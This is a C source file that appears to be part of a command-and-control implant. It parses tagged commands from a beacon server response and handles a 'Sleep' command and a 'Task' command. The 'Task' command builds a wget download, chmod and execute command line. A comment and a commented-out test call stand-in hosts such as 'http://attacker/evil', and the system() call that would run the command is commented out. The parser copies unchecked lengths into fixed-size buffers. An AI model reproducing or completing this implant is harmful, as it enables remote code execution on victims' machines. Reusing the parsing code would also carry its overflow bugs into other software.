#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <libgen.h>

#include "command.h"
#include "colors.h"

int parse_cmds(char *beacon_response, char *cmds[], char *params[]) {
    int cmd_num = 0;
    int n = 1;
    while (1) {
        // parse command
        char open_tag[32];
        char close_tag[32];
        sprintf(open_tag, "<Command%d>", n);
        sprintf(close_tag, "</Command%d>", n);
        
        char *open_pos = strstr(beacon_response, open_tag);
        if (open_pos == NULL)
            break; // no command
        char *cmd_start = open_pos + strlen(open_tag);
        char *close_pos = strstr(beacon_response, close_tag);
        if (close_pos == NULL)
            break; // weird
        size_t cmd_len = (size_t) (close_pos - cmd_start);

        char *cmd = malloc(32);
        if (cmd == NULL)
            break; // shit
        memcpy(cmd, cmd_start, cmd_len);
        cmd[cmd_len] = '\0';
        
        //parse parameter
        char open_param_tag[32];
        char close_param_tag[32];
        sprintf(open_param_tag, "<Command%dParam>", n);
        sprintf(close_param_tag, "</Command%dParam>", n);
        
        char *open_param_pos = strstr(beacon_response, open_param_tag);
        if (open_param_pos == NULL)
            break; // no command received
        char *param_start = open_param_pos + strlen(open_param_tag);
        char *close_param_pos = strstr(beacon_response, close_param_tag);
        if (close_param_pos == NULL)
            break; // weird
        size_t param_len = (size_t) (close_param_pos - param_start);

        char *param = malloc(256);
        if (param == NULL) {
            free(cmd);
            break; // shit
        }
        memcpy(param, param_start, param_len);
        param[param_len] = '\0';
        
        cmds[n-1] = cmd;
        params[n-1] = param;
        n++;
        cmd_num++;
    }
    
    return cmd_num;
}

void do_command(char *cmd, char *param) {
    if (strcmp(cmd, "Sleep") == 0) {
        timeout = (int) strtol(param, NULL, 10);
        printf(GREEN("[SLEEP] Timeout set to %d seconds\n"), timeout);
/*    } else if (strcmp(cmd, "OpenTCPTunnel") == 0) {
        // remote port forwarding: L22C900
    } else if (strcmp(cmd, "CloseTCPTunnel") == 0) {
    
    } else if (strcmp(cmd, "OpenSSHTunnel") == 0) {
    
    } else if (strcmp(cmd, "CloseSSHTunnel") == 0) {
    
    } else if (strcmp(cmd, "OpenDynamic") == 0) {
    
    } else if (strcmp(cmd, "CloseDynamic") == 0) {
*/    
    } else if (strcmp(cmd, "Task") == 0) {
        char *cmd_str = malloc(256);
        if (cmd_str == NULL)
            return;
        char *filename = basename(param);
        // wget -O /tmp/evil http://127.0.0.1/http_client_linux_x64 && chmod u+x /tmp/evil && /tmp/evil
        sprintf(cmd_str, "wget -O /tmp/%s %s && chmod u+x /tmp/%s && /tmp/%s", filename, param, filename, filename);
        printf(GREEN("[TASK] %s\n"), cmd_str);
        // system(cmd_str);
        free(cmd_str);
    }
}

void exec_commands(char *beacon_response) {
    char *cmds[10];
    char *params[10];
    
    int n = parse_cmds(beacon_response, cmds, params);
    
    //printf("Found %d commands\n", n);
    int i;
    //for (i = 0; i < n; i++) {
    //    printf("%s : %s\n", cmds[i], params[i]);
    //}
    
    // execute
    for (i = 0; i < n; i++) {
        do_command(cmds[i], params[i]);
    }
    
    // end
    for (i = 0; i < n; i++) {
        free(cmds[i]);
        free(params[i]);
    }
}

/*
int main() {
    exec_commands("HTTP/1.1 200 OK\r\nContent-Length: 80\r\n\r\n<BeaconResponse>\n\t<Command1>Sleep</Command1>\n\t<Command1Param>30</Command1Param>\n\t<Command2>Task</Command2>\n\t<Command2Param>http://attacker/evil</Command2Param>\n</BeaconResponse>");

    return 0;
}
*/
